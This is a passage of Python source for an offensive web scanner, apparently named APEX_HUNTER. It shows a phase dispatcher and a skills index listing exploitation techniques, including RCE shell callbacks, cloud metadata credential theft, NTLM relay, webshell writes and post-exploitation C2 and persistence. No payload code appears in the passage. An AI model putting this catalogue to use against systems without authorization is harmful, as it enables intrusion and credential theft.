                p = self.t56.run(p, cfg); p = self.t57.run(p, cfg)
                p = self.t58.run(p, cfg); p = self.t59.run(p, cfg)
                p = self.t60.run(p, cfg); p = self.t61.run(p, cfg)
                p = self.t62.run(p, cfg); p = self.t63.run(p, cfg)
                p = self.t64.run(p, cfg); p = self.t65.run(p, cfg)
            elif n == 9:
                p = self.t66.run(p, cfg); p = self.t67.run(p, cfg)
                p = self.t68.run(p, cfg); p = self.t69.run(p, cfg)
                p = self.t70.run(p, cfg); p = self.t71.run(p, cfg)
                p = self.t72.run(p, cfg); p = self.t73.run(p, cfg)
                p = self.t74.run(p, cfg); p = self.t75.run(p, cfg)
                p = self.t76.run(p, cfg); p = self.t77.run(p, cfg)
                p = self.t78.run(p, cfg); p = self.t79.run(p, cfg)
                p = self.t80.run(p, cfg); p = self.t81.run(p, cfg)
                p = self.t82.run(p, cfg); p = self.t83.run(p, cfg)
                p = self.t84.run(p, cfg); p = self.t85.run(p, cfg)
                p = self.t86.run(p, cfg); p = self.t87.run(p, cfg)
                p = self.t88.run(p, cfg); p = self.t89.run(p, cfg)
                p = self.t90.run(p, cfg); p = self.t91.run(p, cfg)
                p = self.t92.run(p, cfg); p = self.t93.run(p, cfg)
                p = self.t94.run(p, cfg); p = self.t95.run(p, cfg)
                p = self.t96.run(p, cfg); p = self.t97.run(p, cfg)
                p = self.t98.run(p, cfg); p = self.t99.run(p, cfg)
                p = self.t100.run(p, cfg); p = self.t101.run(p, cfg)
                p = self.t102.run(p, cfg); p = self.t103.run(p, cfg)
                p = self.t104.run(p, cfg); p = self.t105.run(p, cfg)
            elif n == 10:
                p = self.t106.run(p, cfg); p = self.t107.run(p, cfg)
                p = self.t108.run(p, cfg); p = self.t109.run(p, cfg)
                p = self.t110.run(p, cfg); p = self.t111.run(p, cfg)
                p = self.t112.run(p, cfg); p = self.t113.run(p, cfg)
                p = self.t114.run(p, cfg); p = self.t115.run(p, cfg)
                p = self.t116.run(p, cfg); p = self.t117.run(p, cfg)
                p = self.t118.run(p, cfg); p = self.t119.run(p, cfg)
                p = self.t120.run(p, cfg)
            elif n == 11:
                p = self.t121.run(p, cfg); p = self.t122.run(p, cfg)
                p = self.t123.run(p, cfg); p = self.t124.run(p, cfg)
                p = self.t125.run(p, cfg); p = self.t126.run(p, cfg)
                p = self.t127.run(p, cfg); p = self.t128.run(p, cfg)
                p = self.t129.run(p, cfg); p = self.t130.run(p, cfg)
                p = self.t131.run(p, cfg); p = self.t132.run(p, cfg)
                p = self.t133.run(p, cfg); p = self.t134.run(p, cfg)
                p = self.t135.run(p, cfg); p = self.t136.run(p, cfg)
                p = self.t137.run(p, cfg); p = self.t138.run(p, cfg)
                p = self.t139.run(p, cfg); p = self.t140.run(p, cfg)
                p = self.t141.run(p, cfg); p = self.t142.run(p, cfg)
                p = self.t143.run(p, cfg); p = self.t144.run(p, cfg)
                p = self.t145.run(p, cfg); p = self.t146.run(p, cfg)
                p = self.t147.run(p, cfg); p = self.t148.run(p, cfg)
                p = self.t149.run(p, cfg); p = self.t150.run(p, cfg)
                p = self.t151.run(p, cfg); p = self.t152.run(p, cfg)
                p = self.t153.run(p, cfg); p = self.t154.run(p, cfg)
                p = self.t155.run(p, cfg); p = self.t156.run(p, cfg)
                p = self.t157.run(p, cfg); p = self.t158.run(p, cfg)
                p = self.t159.run(p, cfg); p = self.t160.run(p, cfg)
            elif n == 12:
                p = self.t161.run(p, cfg); p = self.t162.run(p, cfg)
                p = self.t163.run(p, cfg); p = self.t164.run(p, cfg)
                p = self.t165.run(p, cfg); p = self.t166.run(p, cfg)
                p = self.t167.run(p, cfg); p = self.t168.run(p, cfg)
                p = self.t169.run(p, cfg); p = self.t170.run(p, cfg)
                p = self.t171.run(p, cfg); p = self.t172.run(p, cfg)
                p = self.t173.run(p, cfg); p = self.t174.run(p, cfg)
                p = self.t175.run(p, cfg); p = self.t176.run(p, cfg)
                p = self.t177.run(p, cfg); p = self.t178.run(p, cfg)
                p = self.t179.run(p, cfg); p = self.t180.run(p, cfg)
                p = self.t181.run(p, cfg); p = self.t182.run(p, cfg)
                p = self.t183.run(p, cfg); p = self.t184.run(p, cfg)
                p = self.t185.run(p, cfg); p = self.t186.run(p, cfg)
                p = self.t187.run(p, cfg); p = self.t188.run(p, cfg)
            elif n == 13:
                p = self.t211.run(p, cfg); p = self.t212.run(p, cfg)
                p = self.t213.run(p, cfg); p = self.t214.run(p, cfg)
                p = self.t215.run(p, cfg); p = self.t216.run(p, cfg)
                p = self.t217.run(p, cfg); p = self.t218.run(p, cfg)
                p = self.t219.run(p, cfg); p = self.t220.run(p, cfg)
                p = self.t221.run(p, cfg); p = self.t222.run(p, cfg)
                p = self.t223.run(p, cfg); p = self.t224.run(p, cfg)
                p = self.t225.run(p, cfg); p = self.t226.run(p, cfg)
                p = self.t227.run(p, cfg); p = self.t228.run(p, cfg)
                p = self.t229.run(p, cfg); p = self.t230.run(p, cfg)
                p = self.t231.run(p, cfg); p = self.t232.run(p, cfg)
                p = self.t233.run(p, cfg); p = self.t234.run(p, cfg)
                p = self.t235.run(p, cfg); p = self.t236.run(p, cfg)
                p = self.t237.run(p, cfg); p = self.t238.run(p, cfg)
                p = self.t239.run(p, cfg); p = self.t240.run(p, cfg)
                p = self.t241.run(p, cfg); p = self.t242.run(p, cfg)
                p = self.t243.run(p, cfg); p = self.t244.run(p, cfg)
                p = self.t245.run(p, cfg); p = self.t246.run(p, cfg)
                p = self.t247.run(p, cfg); p = self.t248.run(p, cfg)
                p = self.t249.run(p, cfg); p = self.t250.run(p, cfg)
                p = self.t251.run(p, cfg); p = self.t252.run(p, cfg)
                p = self.t253.run(p, cfg); p = self.t254.run(p, cfg)
                p = self.t255.run(p, cfg); p = self.t256.run(p, cfg)
                p = self.t257.run(p, cfg); p = self.t258.run(p, cfg)
                p = self.t259.run(p, cfg); p = self.t260.run(p, cfg)
                p = self.t261.run(p, cfg); p = self.t262.run(p, cfg)
                p = self.t263.run(p, cfg); p = self.t264.run(p, cfg)
                p = self.t265.run(p, cfg); p = self.t266.run(p, cfg)
                p = self.t267.run(p, cfg); p = self.t268.run(p, cfg)
                p = self.t269.run(p, cfg); p = self.t270.run(p, cfg)
            elif n == 14:
                p = self.t271.run(p, cfg); p = self.t272.run(p, cfg)
                p = self.t273.run(p, cfg); p = self.t274.run(p, cfg)
                p = self.t275.run(p, cfg); p = self.t276.run(p, cfg)
                p = self.t277.run(p, cfg); p = self.t278.run(p, cfg)
                p = self.t279.run(p, cfg); p = self.t280.run(p, cfg)
                p = self.t281.run(p, cfg); p = self.t282.run(p, cfg)
                p = self.t283.run(p, cfg); p = self.t284.run(p, cfg)
                p = self.t285.run(p, cfg); p = self.t286.run(p, cfg)
                p = self.t287.run(p, cfg); p = self.t288.run(p, cfg)
                p = self.t289.run(p, cfg); p = self.t290.run(p, cfg)
                p = self.t291.run(p, cfg); p = self.t292.run(p, cfg)
                p = self.t293.run(p, cfg); p = self.t294.run(p, cfg)
                p = self.t295.run(p, cfg); p = self.t296.run(p, cfg)
                p = self.t297.run(p, cfg); p = self.t298.run(p, cfg)
                p = self.t299.run(p, cfg); p = self.t300.run(p, cfg)
                p = self.t301.run(p, cfg); p = self.t302.run(p, cfg)
                p = self.t303.run(p, cfg); p = self.t304.run(p, cfg)
                p = self.t305.run(p, cfg); p = self.t306.run(p, cfg)
                p = self.t307.run(p, cfg); p = self.t308.run(p, cfg)
                p = self.t309.run(p, cfg); p = self.t310.run(p, cfg)
                p = self.t311.run(p, cfg); p = self.t312.run(p, cfg)
                p = self.t313.run(p, cfg); p = self.t314.run(p, cfg)
                p = self.t315.run(p, cfg); p = self.t316.run(p, cfg)
                p = self.t317.run(p, cfg); p = self.t318.run(p, cfg)
                p = self.t319.run(p, cfg); p = self.t320.run(p, cfg)
                p = self.t321.run(p, cfg); p = self.t322.run(p, cfg)
                p = self.t323.run(p, cfg); p = self.t324.run(p, cfg)
                p = self.t325.run(p, cfg); p = self.t326.run(p, cfg)
                p = self.t327.run(p, cfg); p = self.t328.run(p, cfg)
                p = self.t329.run(p, cfg); p = self.t330.run(p, cfg)
                p = self.t331.run(p, cfg); p = self.t332.run(p, cfg)
                p = self.t333.run(p, cfg); p = self.t334.run(p, cfg)
                p = self.t335.run(p, cfg); p = self.t336.run(p, cfg)
                p = self.t337.run(p, cfg); p = self.t338.run(p, cfg)
                p = self.t339.run(p, cfg); p = self.t340.run(p, cfg)
            elif n == 15:
                p = self.t341.run(p, cfg); p = self.t342.run(p, cfg)
                p = self.t343.run(p, cfg); p = self.t344.run(p, cfg)
                p = self.t345.run(p, cfg); p = self.t346.run(p, cfg)
                p = self.t347.run(p, cfg); p = self.t348.run(p, cfg)
                p = self.t349.run(p, cfg); p = self.t350.run(p, cfg)
                p = self.t351.run(p, cfg); p = self.t352.run(p, cfg)
                p = self.t353.run(p, cfg); p = self.t354.run(p, cfg)
                p = self.t355.run(p, cfg); p = self.t356.run(p, cfg)
                p = self.t357.run(p, cfg); p = self.t358.run(p, cfg)
                p = self.t359.run(p, cfg); p = self.t360.run(p, cfg)
        except KeyboardInterrupt:
            warn("Interrupted — saving partial results...")
        except Exception as e:
            warn(f"Phase {n} error: {e}")
        return p

    def run(self) -> List[TargetProfile]:
        SEP = "═" * 70
        print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
        print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
        print(f"{C.WHITE}  360 Tools | 370 Skills | Auto-Chain Execution{C.NC}")
        print(f"{C.WHITE}{SEP}{C.NC}")
        print(f"  Targets : {', '.join(self.cfg.targets)}")
        print(f"  Output  : {self.cfg.output}")
        print(f"  Phases  : {self.cfg.phases}")
        print(f"  Workers : {self.cfg.workers} | Rate: {self.cfg.rate} r/s | Depth: {self.cfg.depth}")
        print(f"{C.WHITE}{SEP}{C.NC}\n")
        profiles = []
        for target in self.cfg.targets:
            banner(f"TARGET: {target}")
            profile = self._init_profile(target)
            for phase in sorted(self.cfg.phases):
                profile = self._run_phase(phase, profile)
                time.sleep(0.5 / self.cfg.rate)
            profiles.append(profile)
            # Per-target summary
            cnts = Counter(f.severity for f in profile.findings)
            banner(f"Summary — {profile.host}")
            for sev, col in [("CRITICAL",C.RED),("HIGH",C.RED),("MEDIUM",C.YELLOW),("LOW",C.CYAN),("INFO",C.DIM)]:
                if cnts.get(sev): print(f"  {col}{sev}: {cnts[sev]}{C.NC}")
        self.reporter.run(profiles)
        banner("Complete")
        ok(f"Total findings: {sum(len(p.findings) for p in profiles)} across {len(profiles)} target(s)")
        ok(f"Reports: {self.cfg.output}/")
        return profiles

# ══════════════════════════════════════════════════════════════
# SKILLS INDEX
# ══════════════════════════════════════════════════════════════
SKILLS_INDEX = """
APEX_HUNTER v1.0 — Skills Index (370 Skills / 360 Tools)
═════════════════════════════════════════════════════════
SKILL-01  DNS resolution & multi-record enumeration
SKILL-02  TLS version, cipher, certificate, SAN extraction
SKILL-03  Certificate Transparency log mining (crt.sh)
SKILL-04  Wayback Machine CDX API URL + parameter mining
SKILL-05  WAF/CDN fingerprinting (14 provider signatures)
SKILL-06  Technology stack detection (30 signatures)
SKILL-07  HTTP security header audit & scoring (10 headers / 100pts)
SKILL-08  CSP weakness analysis (8 patterns)
SKILL-09  CORS misconfiguration testing (6 origin bypass patterns)
SKILL-10  Cookie security attribute audit (Secure/HttpOnly/SameSite/__Host-)
SKILL-11  JavaScript file discovery + endpoint/parameter extraction
SKILL-12  Webpack sourcemap discovery + source file enumeration
SKILL-13  Secret/credential scanning with Shannon entropy (25 patterns)
SKILL-14  API endpoint discovery + Swagger/OpenAPI spec detection
SKILL-15  GraphQL introspection + schema extraction
SKILL-16  Sensitive file/directory enumeration (50+ paths)
SKILL-17  S3 bucket enumeration + public listing test
SKILL-18  Subdomain takeover detection (11 provider fingerprints)
SKILL-19  SSRF parameter identification + open redirect testing
SKILL-20  IDOR pattern mapping from historical URLs
SKILL-21  XSS injection surface identification (forms + inputs)
SKILL-22  ASN/hosting provider identification from IP CIDR ranges
SKILL-23  Wildcard DNS detection
SKILL-24  Googlebot WAF bypass testing
SKILL-25  Short-lived certificate (ACME/Let's Encrypt) detection
SKILL-26  Virtual host + subdomain live resolution
SKILL-27  Auto-chained PoC curl generation per finding
SKILL-28  CVSS v3.1 scoring + CWE/OWASP mapping
SKILL-29  Multi-format report export (JSON/HTML/Markdown/CSV)
SKILL-30  Burp Suite request template generation

NEW (Phase 7):
SKILL-31  HTTP Request Smuggling — CL.TE / TE.CL / TE.TE timing detection
SKILL-32  JWT vulnerability scanning — alg=none, weak secret, RS256→HS256
SKILL-33  OAuth 2.0 flow analysis — missing state, implicit flow, PKCE downgrade
SKILL-34  Host header injection — password reset poisoning + cache poisoning
SKILL-35  HTTP Parameter Pollution — duplicate params, array notation
SKILL-36  Rate limit bypass — X-Forwarded-For/X-Real-IP header spoofing
SKILL-37  Cache poisoning — unkeyed header injection + cache deception paths
SKILL-38  SSTI detection — {{7*7}} polyglot across Jinja2/Twig/Pebble/ERB
SKILL-39  XXE injection — OOB XXE, error-based file read, SVG vector, SOAP
SKILL-40  Prototype pollution — __proto__, constructor.prototype, URL + JSON
SKILL-41  GraphQL advanced attacks — batch aliases, introspection bypass
SKILL-42  Dependency confusion — internal package name leakage detection
SKILL-43  Business logic probe — negative price, overflow, coupon manipulation
SKILL-44  WebSocket security — CSWSH, ws:// downgrade, Origin bypass
SKILL-45  BOLA/IDOR deep scan — mass assignment, privilege escalation patterns

NEW (Phase 8 — 30 Advanced Red Team Skills):
SKILL-46  SQL injection — error-based + boolean-blind detection (9 DB engines)
SKILL-47  NoSQL injection — MongoDB $gt/$ne/$where/$regex operator injection
SKILL-48  Command injection — echo/id reflection-safe blind detection
SKILL-49  File upload bypass — double extension, polyglot JPEG+PHP, MIME confusion
SKILL-50  CSRF detection — missing token, no SameSite, no Origin validation
SKILL-51  Clickjacking — X-Frame-Options absent + frame-ancestors wildcard
SKILL-52  HTTP method tampering — TRACE/WebDAV/method override headers
SKILL-53  Account enumeration timing — login response time differential
SKILL-54  Path/ACL bypass — /admin/../user/ traversal + encoding bypass
SKILL-55  API version downgrade — v3→v1 privilege regression testing
SKILL-56  TLS misconfiguration — TLS 1.0/1.1 + weak ciphers (RC4/3DES/EXPORT)
SKILL-57  DNS zone transfer — AXFR attempt via system dig command
SKILL-58  Deserialization detection — Java magic bytes / PHP O:/ ViewState
SKILL-59  Blind SSRF — OOB payload generator (DNS/HTTP interactor URLs)
SKILL-60  Email header injection — CRLF in From/CC field for spam relay
SKILL-61  JSONP discovery — callback= CSP bypass + data leakage endpoints
SKILL-62  Referer ACL bypass — spoofed Referer to bypass origin-based access control
SKILL-63  2FA endpoint finder — OTP endpoint discovery + rate-limit absence
SKILL-64  Error page intelligence — stack traces / version strings in 4xx/5xx
SKILL-65  Open redirect chain — multi-hop + OAuth redirect_uri parameter abuse
SKILL-66  HTML injection — dangling markup + unencoded HTML in responses
SKILL-67  CORS preflight analysis — OPTIONS method + ACAO wildcard/null check
SKILL-68  Password reset poisoning — Host header poisoning + token reuse
SKILL-69  WebDAV scanner — PROPFIND 207 + PUT arbitrary file write attempt
SKILL-70  Content-Type confusion — MIME-type mirroring XSS via Content-Type
SKILL-71  Internal service discovery — SSRF→metadata/Kubernetes/internal map
SKILL-72  Subdomain live check — deep service fingerprinting on resolved hosts
SKILL-73  LFI scanner — /etc/passwd read via path traversal (10 encoding variants)
SKILL-74  Session security — fixation / token-in-URL / regeneration absence
SKILL-75  VDP discovery — security.txt + bug-bounty scope + Hall of Fame links

NEW (Phase 9 — 40 Advanced Red Team Skills):
SKILL-76  GraphQL batch/alias DoS — unbounded batching + alias amplification + depth
SKILL-77  Subresource Integrity (SRI) checker — CDN scripts/styles without integrity attr
SKILL-78  postMessage analyzer — listener without event.origin validation
SKILL-79  Web cache deception — /account.css path confusion triggering public cache
SKILL-80  Service worker audit — root-scope, importScripts external, credential forwarding
SKILL-81  CRLF / HTTP response splitting — %0d%0a header injection
SKILL-82  SAML vulnerability scanner — endpoint exposure for XSW/XXE/replay assessment
SKILL-83  OAuth2 implicit flow — response_type=token detection + fragment token exposure
SKILL-84  Virtual host fuzzer — Host header fuzzing for hidden vhosts
SKILL-85  Race condition tester — parallel request window detection on state-change EPs
SKILL-86  Token leakage scanner — auth tokens in redirect URLs + response body
SKILL-87  Cloud metadata SSRF — AWS/GCP/Azure IMDS payloads via SSRF parameters
SKILL-88  ETag inode leakage — Apache inode-size-mtime format exposure
SKILL-89  API auth bypass headers — X-Auth-User/X-Remote-User/X-Forwarded-User bypass
SKILL-90  Path parameter injection — REST path param IDOR + traversal + type confusion
SKILL-91  HTTP Trace XST — TRACE method + HttpOnly cookie cross-site tracing
SKILL-92  CSS injection / exfiltration — style attribute injection + attribute selectors
SKILL-93  CORS credential exposure — credentials:include + wildcard/reflected ACAO
SKILL-94  Mass assignment fuzzer — hidden privileged field injection in JSON APIs
SKILL-95  JWKS poisoning — JWK set URI exposure + alg:none detection
SKILL-96  ReDoS probe — catastrophic regex backtracking via crafted inputs
SKILL-97  Subdomain takeover v2 — extended fingerprints + dangling DNS detection
SKILL-98  HTTP/2 Rapid Reset — CVE-2023-44487 exposure assessment
SKILL-99  WebSocket CSWSH — cross-site WebSocket hijacking via Origin bypass
SKILL-100 Prototype pollution advanced — query string + JSON body + URL-encoded
SKILL-101 HPP advanced — REST/multipart/array notation parameter pollution
SKILL-102 IDOR v2 — second-order IDOR via object refs in API response bodies
SKILL-103 Forced browsing — admin/backup/config/debug unlinked page discovery
SKILL-104 Sensitive data exposure — PII/keys/internal IPs in API responses
SKILL-105 BFLA scanner — broken function-level authorization on privileged HTTP methods
SKILL-106 GraphQL mutation fuzzer — mass create + privilege escalation mutations
SKILL-107 Insecure CORS on API — arbitrary Origin reflection on authenticated endpoints
SKILL-108 SSL pinning bypass hints — certificate fingerprints for mobile research
SKILL-109 GraphQL field suggestion leak — hidden schema field enumeration via typos
SKILL-110 Dependency confusion v2 — multi-ecosystem manifest leakage (npm/pypi/gem/maven)
SKILL-111 Improper error handling — verbose stack traces + version strings
SKILL-112 HTTP desync advanced — CL.TE/TE.CL differential smuggling probes
SKILL-113 OAuth state CSRF — missing/predictable state parameter detection
SKILL-114 Exposed debug endpoints — pprof/jolokia/metrics/telescope/horizon/xdebug
SKILL-115 Blind OS command injection — echo-marker reflection via safe payloads

NEW (Phase 10 — BLACK TEAM — 15 Advanced Exploitation Skills):
SKILL-116 Log4Shell (CVE-2021-44228) — JNDI injection in 10 headers + OOB PoC
SKILL-117 XPath injection — boolean bypass + blind enumeration in auth/search
SKILL-118 LDAP injection — filter bypass (*(uid=*)) in login/directory endpoints
SKILL-119 SSI / ESI injection — <!--#exec cmd--> + <esi:include> detection
SKILL-120 PDF/HTML-to-PDF SSRF — file:// + metadata via headless renderer endpoints
SKILL-121 JWT algorithm confusion — RS256→HS256 public-key-as-secret forgery
SKILL-122 Blind XXE OOB — DTD-load payload generator + SVG XXE vector
SKILL-123 SSTI → RCE chain — Jinja2/Twig/FreeMarker/Velocity class-traversal PoC
SKILL-124 Cache poisoning advanced — fat GET, unkeyed cookie, X-Original-URL, param cloak
SKILL-125 OAuth token Referer leak — callback page third-party resource leakage
SKILL-126 SOAP/XML injection — CDATA injection, Billion Laughs, external entity
SKILL-127 PHP type juggling — 0e magic hash, null/false coercion, array bypass
SKILL-128 Webhook/callback SSRF — server-side URL fetch via notification endpoints
SKILL-129 Timing oracle — non-constant-time token comparison detection
SKILL-130 Full chain PoC generator — auto-synthesise exploit chain from all findings

NEW (Phase 11 — BLACK TEAM — 40 Expert Exploitation Skills):
SKILL-131 JWT kid header injection — path traversal (../../dev/null) + SQLi in kid value
SKILL-132 ZIP Slip / archive traversal — ../../ paths in DOCX/ZIP upload endpoints
SKILL-133 Reflected File Download (RFD) — Content-Disposition CRLF injection
SKILL-134 GraphQL circular fragment DoS — recursive fragment + 100-alias amplification
SKILL-135 UUID v1 IDOR prediction — timestamp-based UUID enumeration
SKILL-136 SAML signature wrapping (XSW) — all 8 XSW variants with PoC structure
SKILL-137 OAuth2 PKCE downgrade — missing code_challenge enforcement detection
SKILL-138 H2C smuggling — HTTP/2 cleartext upgrade request smuggling (101 probe)
SKILL-139 Insecure crypto detection — MD5/SHA-1/RC4 in headers, params, and bodies
SKILL-140 JWE misuse — alg=dir with guessable key detection in JWT/cookie tokens
SKILL-141 .NET ViewState MAC bypass — byte-flip resubmit + ysoserial.net RCE chain
SKILL-142 SSRF URL parser bypass — @, hex, decimal, IPv6-mapped, unicode-dot bypasses
SKILL-143 DNS rebinding attack surface — TTL, private IP, null-Origin CORS analysis
SKILL-144 GraphQL alias credential stuffing — 10 passwords in one batched mutation
SKILL-145 Stored XSS in API fields — write+read cycle on profile/comment/message endpoints
SKILL-146 XXE via DOCX/XLSX upload — [Content_Types].xml entity injection in OOXML
SKILL-147 Server-Timing info leak — internal component names in Server-Timing header
SKILL-148 NoSQL blind timing injection — $where sleep() MongoDB differential timing
SKILL-149 ImageMagick SSRF — MVG/MSL delegate SSRF + CVE-2016-3714 family
SKILL-150 LFI → RCE log poisoning — PHP in User-Agent + /var/log/apache2 chain
SKILL-151 HTTP method override SSRF — X-HTTP-Method-Override WAF bypass
SKILL-152 Session token entropy analysis — length, charset, Shannon entropy scoring
SKILL-153 CORS Private Network Access bypass — Access-Control-Request-Private-Network
SKILL-154 Parameter fragmentation / hiding — split across body+QS, null byte, array
SKILL-155 JWT audience (aud) bypass — alg=none with wildcard/host audience forgery
SKILL-156 Reverse proxy path confusion — %2f, %252f, /;/admin, /.;/ normalisation bypass
SKILL-157 OOB SQL injection via DNS — MySQL/MSSQL/Oracle/PostgreSQL DNS exfil payloads
SKILL-158 Auth bypass via duplicate parameters — WAF-vs-backend param deduplication
SKILL-159 Insecure mobile deep-link endpoints — scheme injection + open redirect
SKILL-160 Advanced exploit chain synthesiser — 8 named attack chain patterns with narrative
SKILL-161 GraphQL subscription SSRF — pubsub connection_init URL parameter SSRF
SKILL-162 Post-login open redirect — next/return parameter token theft after auth
SKILL-163 HTTP verb tunnelling WAF bypass — POST+_method=DELETE vs direct DELETE
SKILL-164 API schema disclosure via OPTIONS — Allow header + schema/WADL leak
SKILL-165 CL request smuggling obfuscation — space/tab TE header obfuscation probes
SKILL-166 IDOR via hashed ID — MD5/SHA-1 of sequential integer pre-image reversal
SKILL-167 Blind SSTI in email templates — async template injection via contact/subscribe
SKILL-168 OIDC misconfiguration scanner — implicit flow, alg=none, PKCE-plain, pub sub
SKILL-169 Prototype pollution via cookie name — __proto__[key] in Cookie header
SKILL-170 Business logic advanced — negative price, int32 overflow, zero-price, oversized refund

NEW (Phase 12 — BLACK TEAM — 50 Full Exploitation & Post-Exploitation Skills):
SKILL-171 RCE verification chain — 6 OOB DNS-callback shell payloads (bash, curl, wget, python, nslookup, ping)
SKILL-172 Webshell upload path detector — probe 40+ common webshell/backdoor paths + content signature matching
SKILL-173 Timing-based SQLi extractor — differential timing across 6 DB engines (MySQL, MSSQL, PgSQL, Oracle, SQLite)
SKILL-174 LDAP injection → privesc chain — 6 bypass payloads, group enumeration, DN manipulation
SKILL-175 NTLM hash leak detection — NTLM/Negotiate challenge capture for offline relay + cracking
SKILL-176 Azure IMDS exploit chain — SSRF → managed identity OAuth2 token → full Azure control plane
SKILL-177 AWS IMDS exploit chain — SSRF → IMDSv1/v2 → IAM role credentials → aws sts
SKILL-178 GCP metadata exploit chain — SSRF → GCP IMDS → service account OAuth2 token
SKILL-179 Kubernetes API server detection — 12 K8s endpoints, RBAC misconfiguration, anonymous access
SKILL-180 Docker daemon API exposed — TCP 2375/2376, privileged container escape, host filesystem mount
SKILL-181 Jenkins RCE detector — script console, Groovy exec, credentials.xml, unauthenticated /api
SKILL-182 GitLab token scanner — PAT regex (glpat-), CI/CD variable exposure, unauthenticated API
SKILL-183 Supply chain attack surface — manifest exposure, internal package name detection, dep confusion
SKILL-184 Cloudflare/CDN origin bypass — CT log IP discovery, cdn-cgi/trace, direct-to-origin probe
SKILL-185 WAF bypass payload generator — 8 bypass variants per vuln type (SQL/XSS/SSTI/CMDi/Path)
SKILL-186 Webshell path detector — 40 webshell locations, signature matching (eval/system/exec/passthru)
SKILL-187 Privilege escalation path hints — SUID, sudo, cron, Docker socket, capabilities from debug pages
SKILL-188 JMX/Jolokia RCE detector — MBeans exec, ClassLoader injection, JNDI callback surface
SKILL-189 Spring Boot actuator full exposure — env/heapdump/configprops/shutdown/logfile/httptrace
SKILL-190 Elasticsearch cluster exposed — index enumeration, data dump, Painless script RCE surface
SKILL-191 .git repository exposed — HEAD/config/COMMIT_EDITMSG, git-dumper PoC, source extraction
SKILL-192 .env / config file leak — 35 paths, secret key detection (DB_PASSWORD/API_KEY/AWS_ACCESS_KEY)
SKILL-193 Backup file leak — archive dumps, .bak/.old/.swp files, database SQL dumps
SKILL-194 Redis exposed without auth — CONFIG SET webshell write, SLAVEOF persistence, key dump
SKILL-195 GraphQL batch DoS — 200-alias amplification, nested introspection, circular fragment
SKILL-196 Full exploit narrative generator — 5 named attack chains with step-by-step exploitation story
SKILL-197 Post-exploitation path analyzer — RCE/SQLi/SSRF/LFI/JWT post-exploit playbooks
SKILL-198 Attack surface scorecard — weighted risk score, severity distribution, remediation priority matrix
SKILL-199 RCE OOB DNS chain (extended) — alternate interpreter payloads for WAF-bypassed injection
SKILL-200 Azure IMDS extended — Key Vault token, subscription enumeration, managed identity pivot
SKILL-201 AWS IMDS extended — user-data script, account document, role credential chain
SKILL-202 Jenkins extended — Groovy RCE chain, credentials.xml decrypt, pipeline secrets
SKILL-203 Elasticsearch extended — snapshot repository, cross-cluster, script injection
SKILL-204 Env file extended — service-account.json, firebase.json, appsettings.Production
SKILL-205 Git repo extended — packed-refs, log poison via .git hooks, stash recovery
SKILL-206 Spring actuator extended — /env POST to override properties, /restart + config poisoning
SKILL-207 K8s extended — secrets enumeration, service account token, pod exec path
SKILL-208 Supply chain extended — Cargo.lock, pom.xml, go.mod internal dependency analysis
SKILL-209 WAF bypass extended — Unicode normalisation, chunked encoding, HTTP/2 header injection
SKILL-210 Scorecard extended — full remediation roadmap, SLA calculation, executive summary block
SKILL-211 Timing SQLi extended — JSON body injection, header injection, HTTP/2 timing
SKILL-212 LDAP extended — MS-AD group dump, cn=users, DC enumeration, Kerberos hint
SKILL-213 NTLM extended — Hash relay path (Responder, ntlmrelayx), hash crack wordlist guidance
SKILL-214 Webshell extended — JSP/ASP/ASPX/CFM shell paths, .NET ViewState payload
SKILL-215 Docker extended — socket SSRF, swarm API, registry credentials
SKILL-216 GitLab extended — runner token, webhook secret, deploy key enumeration
SKILL-217 Cloudflare extended — origin reveal via Shodan dork, SPF record, email header analysis
SKILL-218 Privesc extended — SUID3 family, NFS no_root_squash, LXD escape, namespace analysis
SKILL-219 JMX extended — hawtio dashboard, jolokia exec chain, JNDI LDAP/RMI PoC
SKILL-220 Post-exploit extended — lateral movement paths, C2 staging, persistence mechanism hints

NEW (Phase 13 — RED+BLACK TEAM — 60 Advanced Exploitation Skills):
SKILL-221 OGNL injection (Struts2 S2-045/S2-061) — Content-Type + param injection, Groovy/OGNL RCE chain
SKILL-222 EL injection — Spring SpEL, JSP EL, Thymeleaf expression evaluation to RCE
SKILL-223 Velocity/FreeMarker/Pebble/Smarty SSTI — 10 engine-specific payloads, RCE chain
SKILL-224 OAuth2 device code abuse — phishing-grade device flow, token polling, real-time interception
SKILL-225 Azure AD misconfiguration — implicit flow token leak, tenant enumeration, consent phishing
SKILL-226 AWS S3 presigned URL abuse — bucket policy probe, cross-account, public listing test
SKILL-227 Nginx misconfiguration — off-by-slash alias traversal, status page, URL normalisation bypass
SKILL-228 Traefik dashboard exposure — API rawdata, route enumeration, backend service discovery
SKILL-229 ArgoCD API/UI exposed — unauthenticated app list, cluster credentials, Git repo access
SKILL-230 DOM clobbering detector — innerHTML sinks, clobbering form/anchor/iframe, sink enumeration
SKILL-231 Mutation XSS (mXSS) — noscript/listing/xmp/textarea bypass, DOMPurify evasion
SKILL-232 CBC padding oracle — response length/timing differential across 6 tampered token variants
SKILL-233 Weak PRNG detector — Shannon entropy < 3.5 bits/char, sequential token analysis
SKILL-234 gRPC endpoint prober — server reflection, health check, protobuf schema leak, grpc-web
SKILL-235 Kerberos/SPNEGO hint detector — AS-REP roasting surface, NTLM relay, SPN enumeration
SKILL-236 Apache Struts2 CVE detection — .action/.do enumeration, S2-045/S2-061/S2-066 signatures
SKILL-237 Log4Shell follow-on — CVE-2021-45046 bypass, 8 JNDI obfuscation variants, 13 injection headers
SKILL-238 Mobile API key detector — 18 patterns: Google/Firebase/OpenAI/Stripe/Slack/GitHub/AWS/SendGrid
SKILL-239 WebSocket SSRF pivot — upgrade probe, WS→internal SSRF, cloud IMDS via WS payload
SKILL-240 Helm chart / K8s secret exposure — values.yaml, docker-compose, terraform.tfvars, ansible vault
SKILL-241 Internal API gateway routes — Spring Cloud Gateway, internal lb:// services, Swagger leak
SKILL-242 Advanced CSRF — JSON content-type bypass, multipart CSRF, SameSite bypass, origin bypass
SKILL-243 XXE via SVG/XLIFF/RSS — OOB DNS callback, /etc/passwd read, SSRF via file parser
SKILL-244 Broken function level auth — 16 admin paths, JWT alg=none bypass, privilege header injection
SKILL-245 DNS exfiltration channel — capacity analysis (~189 chars/query), 6 exfil payload templates
SKILL-246 Serverless / FaaS exposure — Lambda/Azure Functions/Cloud Run/Netlify/Vercel endpoint detection
SKILL-247 OGNL extended — classLoader URL leak, xwork2 container access, AllowStaticMethodAccess chain
SKILL-248 EL extended — Spring applicationContext leak, ThymeleafRequest class, SpEL runtime exec
